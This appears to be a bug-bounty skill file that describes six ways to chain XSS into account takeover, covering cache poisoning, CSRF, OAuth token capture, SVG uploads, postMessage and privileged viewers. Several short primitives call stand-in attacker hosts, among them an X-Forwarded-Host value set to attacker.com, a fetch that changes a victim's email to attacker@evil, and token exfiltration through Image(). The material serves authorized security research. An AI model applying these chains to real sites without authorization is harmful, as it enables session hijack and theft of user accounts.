## Chains & Compositions (Senior Hunting)

XSS as a standalone finding gets paid at Low-Medium on mature programs. Real payouts cluster around chains that convert JS execution into account takeover, mass-victim impact, CSP bypass, or token exfil. The composition skill is *"what does my XSS unlock once it executes?"* — and the answer is always something beyond `alert(1)`.

### Chain 1 — Reflected XSS + Cache Poisoning → Persistent Stored XSS at CDN Scale (Kettle-class)

- **A.** Identify a reflected XSS where the vulnerable input lands in the response body and the response is cacheable (`Cache-Control: public, max-age=…`).
- **B.** Identify an unkeyed input that influences the cached body — typically `X-Forwarded-Host`, `X-Original-URL`, an unkeyed cookie, or a parameter stripped from the cache key but reflected in the body.
- **C.** Send a single request with the XSS payload via the unkeyed input. Cache stores the poisoned response. Every subsequent CDN-edge visitor receives it for the full TTL.
- **Impact:** Self-inflicted reflected XSS becomes persistent stored XSS affecting every visitor in the affected geo until cache expires. No per-victim interaction required.
- **Real shape:** Glassdoor reflected→stored XSS via cache poisoning, H1 #1424094 (2021-2022); Kettle "Practical Web Cache Poisoning" research. Cross-refs `hunt-cache-poison` Disclosed Report Citation #4.

### Chain 2 — Self-XSS + CSRF Trigger → Effective Stored XSS → ATO

- **A.** Confirm self-XSS in a profile field (`bio`, `display_name`, `signature`) — payload only executes when the same logged-in user views their own profile.
- **B.** Find a CSRF-vulnerable endpoint that mutates that field (no anti-CSRF token, or `text/plain` enctype bypass).
- **C.** Craft attacker-hosted page that submits the CSRF form setting `bio` to the XSS payload. Victim visits attacker page → CSRF fires → victim's profile updated → victim's next visit to their own profile executes attacker JS.
- **Impact:** Self-XSS that "doesn't pay" becomes ATO. The payload runs in the victim's authenticated session — extract cookie, force email change via XHR, password reset → full ATO.
- **Real shape:** Multiple H1 disclosures 2019-2023 across social platforms. Cross-refs `hunt-csrf` step 7 (form-based CSRF on profile mutation).

### Chain 3 — DOM XSS on /signin or /oauth Callback → Fragment Token Capture → ATO

- **A.** Find DOM XSS on a `/signin`, `/oauth/callback`, or `/auth/return` page — typically `document.location.hash` parsed into the DOM without escaping.
- **B.** OAuth-implicit-flow callbacks frequently land tokens in the URL fragment (`#access_token=...`). The fragment is NOT sent to the server; only the browser sees it.
- **C.** XSS payload reads `document.location.hash`, base64-encodes it, exfils via `Image()` to attacker domain. Attacker now holds the OAuth access token.
- **Impact:** Cross-platform ATO. The access token typically grants API scope to Facebook/Google/Microsoft user data; some implementations use the token directly as the session.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor OAuth token leakage (F. Rosén, 2022); Zoom OAuth chained ATO $15,000 (H1 / Harel Security, 2024). Cross-refs `hunt-oauth` Disclosed Report Citation #19 and #20.

### Chain 4 — SVG Upload XSS + CSP Bypass → JS Execution on Trusted Origin → Cookie/Token Theft

- **A.** Identify a file-upload feature that accepts `image/svg+xml`. SVG files are XML and can contain `<script>` tags — many sanitisers process PNG/JPG but pass SVG through unmodified.
- **B.** CSP frequently applies to HTML responses but NOT to `image/svg+xml` responses. The SVG executes JS in the context of whichever origin serves it.
- **C.** If the SVG is served same-origin (common when uploads go to `target.com/uploads/<sha>.svg`), the executing JS has full session-cookie access and can call any same-origin API.
- **Impact:** Stored XSS on the trusted origin without going through any reflected/stored content vector — bypasses CSP entirely; pulls session cookies, calls password-change endpoints, ATO.
- **Real shape:** Multiple disclosed cases across SaaS uploaders; cross-refs `hunt-file-upload` SVG section and `hunt-xxe` Disclosed Report Citation #3 and #4 (Zivver/Lab45 SVG-upload chains).

### Chain 5 — postMessage XSS + Origin Check Bypass → Cross-Origin Token Exfil → ATO

- **A.** Identify a `window.addEventListener('message', handler)` where `handler` does NOT check `event.origin` (or checks it with a `indexOf`/`endsWith` that fails on `target.com.attacker.com`).
- **B.** Attacker page opens `target.com` in a popup or iframe. Once loaded, sends a `postMessage` payload that the handler evals, processes as XSS, or uses to extract `document.cookie`.
- **C.** Handler executes in `target.com` context; response is `postMessage`'d back to attacker page via `event.source.postMessage(stolenData, '*')`.
- **Impact:** Cross-origin JS execution and exfil with no CSP violation — `postMessage` is a legitimate cross-origin channel; CSP doesn't gate it. Token theft / session hijack.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor postMessage gadgets (2022); Zoom OAuth + postMessage chain (2024). Cross-refs `hunt-oauth` Disclosed Report Citation #19, #20.

### Chain 6 — Markdown/Wiki XSS + Privileged Viewer → Cross-Privilege Stored XSS

- **A.** Stored XSS in a collaborative content field (wiki page, issue comment, customer ticket, support reply) — payload survives Markdown rendering due to insufficient allowlist on `<style>`, `<math>`, `<svg>`, or attribute filters.
- **B.** The collaborative content is viewed by a privileged user (admin, support agent with elevated permissions, project maintainer).
- **C.** Privileged viewer's session executes the payload in their authenticated context — XHR to admin-only endpoints, role-change of attacker, secret exfil from admin-only panels.
- **Impact:** Privilege escalation from low-priv user to admin via stored XSS — attacker promotes themselves on the privileged user's behalf.
- **Real shape:** GitLab/Jira/Confluence markdown-XSS-to-admin-priv-esc class; common payout pattern is High (privilege escalation severity bump over standalone stored XSS).

### Operator-level pattern

When you confirm XSS at A, immediately ask: what state-changing endpoint or token store does this JS now have access to? *Where does the payload run, and who sees it?* The chain payout is 5-20x the standalone XSS payout. Discipline gate before submission: do not file XSS as "Critical" without demonstrating the terminal impact (ATO / token exfil / privilege escalation); file as Medium otherwise.

## Related Skills & Chains

- **`hunt-cache-poison`** — Reflected XSS becomes stored-equivalent at CDN scale when the vulnerable parameter is unkeyed. Chain primitive: `X-Forwarded-Host: attacker.com` poisons a cached response whose `<script src=...>` now points at attacker.com → every CDN-edge visitor executes attacker JS without any per-victim interaction.
- **`hunt-csrf`** — XSS on origin auto-defeats SameSite=Lax and same-origin checks for state-changing endpoints. Chain primitive: stored XSS in profile bio → fetch(`/settings/email`, {method:'POST', body:'email=attacker@evil'}) executes with victim's cookies and origin → silent email takeover → password reset → full ATO without the victim ever leaving the page.
- **`hunt-http-smuggling`** — Smuggling delivers an XSS payload into the response queue of the NEXT victim's request, even on endpoints that sanitize their own inputs. Chain primitive: smuggle a request whose response (carrying attacker HTML) is served as the body of the next legitimate user's GET / → reflected XSS at every visitor without any URL parameter visible in their address bar.
- **`security-arsenal`** — Reach for the XSS payload bank (SVG+style, math+style mXSS, CSP-bypass JSONP gadgets, HTML5 event handlers WAFs miss) before hand-crafting payloads; also the always-rejected list to confirm self-XSS / alert-only PoCs are not submittable.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on stored XSS that only fires in the attacker's own session, or before claiming reflected XSS where the canary appears HTML-encoded (`&lt;`) in the response body — those are the two most common downgrade-to-N/A traps.
